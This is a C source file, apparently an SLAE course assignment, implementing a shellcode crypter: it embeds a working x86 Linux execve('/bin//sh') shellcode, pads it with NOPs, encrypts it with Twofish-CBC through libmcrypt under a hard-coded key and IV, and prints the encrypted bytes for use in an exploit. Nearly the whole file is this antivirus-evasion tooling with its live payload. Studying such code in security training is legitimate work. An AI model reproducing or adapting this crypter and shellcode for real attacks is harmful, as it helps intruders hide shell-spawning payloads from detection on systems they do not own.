/*
 *in this assignment I will be using the following API:
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
 *which is providing a lot of encryption algorthims in it
 *Encryption Algorithim used: Two Fish
 *Auther: H4554n AlMusajjen
 *SLAE - 1057

executing this file as shown below:
	gcc crypter_en.c /usr/lib/libmcrypt.a -o encrypter
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>

int encrypt(	void* buffer,	int buffer_len,	char* IV,	char* key,	int key_len)
{
  MCRYPT td = mcrypt_module_open("twofish", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){printf("Buffer_length must give us zero reminder when deviding it on blocksize");return 1;}
  //initializing all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);
  //the main encryption function
  mcrypt_generic(td, buffer, buffer_len);
  //terminating encryption specified by the encryption descriptor (td)
  mcrypt_generic_deinit (td);
  //closing the modules used by the descriptor td.
  mcrypt_module_close(td);
  return 0;
}

void display(char* ciphertext, int len){
  int v;
  for (v=0; v<len; v++){
    printf("%d ", ciphertext[v]);
  }
  printf("\n");
}


int main()
{
 MCRYPT td, td2;
  unsigned char * plaintext = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
  char* IV = "AAAAAAAAAAAAAAAA";
  char *key = "1234567890fedcba";
  int keysize = 16; /* 128 bits */
  /*
   The buffer needs to be a multiple of 16 to work, so you need to pick the multiple closest to the length of your shellcode. Since this shellcode is 25 bytes long,
    our buffer will need to be 32 bytes of length.
  */
  unsigned char buffer[32];
  int counter; 
  int buffer_len = 32;
 /*
 Initialize the buffer and make sure all bytes are set to 0x90, which is nop. This will prevent null bytes coming out of the decrypted
 shellcode and breaking the exploit.
 */
 for ( counter = 0; counter < buffer_len; counter++){
   buffer[counter]=0x90;
  }
  /*
   Now copy the plaintext shellcode to the buffer
  */
  strncpy(buffer, plaintext, buffer_len);
  int plain_len = strlen(plaintext);
  printf("==Plain Binary==\n");
  for ( counter = 0; counter < plain_len; counter++){
    printf("%02x",plaintext[counter]);
  }
  /**
   Encrypt the buffer
  **/
  encrypt(buffer, buffer_len, IV, key, keysize); 
  printf("\n==Encrypted  Binary==\n"); 
  for ( counter = 0; counter < buffer_len; counter++){
   printf("\\x%02x",buffer[counter]);
  }




}
